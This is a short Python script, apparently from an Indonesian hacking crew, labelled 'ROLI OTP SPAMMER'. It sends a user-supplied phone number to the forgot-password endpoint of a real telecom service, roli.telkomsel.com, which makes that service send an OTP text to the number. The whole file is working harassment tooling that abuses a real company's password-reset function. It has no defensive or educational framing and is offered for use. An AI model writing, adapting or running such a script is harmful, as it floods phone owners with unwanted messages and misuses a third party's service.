# FB: fb.me/widhisec | IG : @widhisec | YT : zsecc0de-crew ID
# ga usah di recode capek w bikin
try:
	from requests import post
except Exception as x:
	   print ("modul err0r %s"% (x))
class roli:
	  urlz = "https://roli.telkomsel.com/auth/forgot_password"
o = input("Masukkan Number :")
fuck = {'msisdn':o}
ajg = post(roli.urlz,fuck)
print (ajg.json()["message"])
if __name__ == '__main__':
	print ("""
    < ROLI OTP SPAMMER >
    < POWERED BY ZSECC0DE-CREW.ID
    """)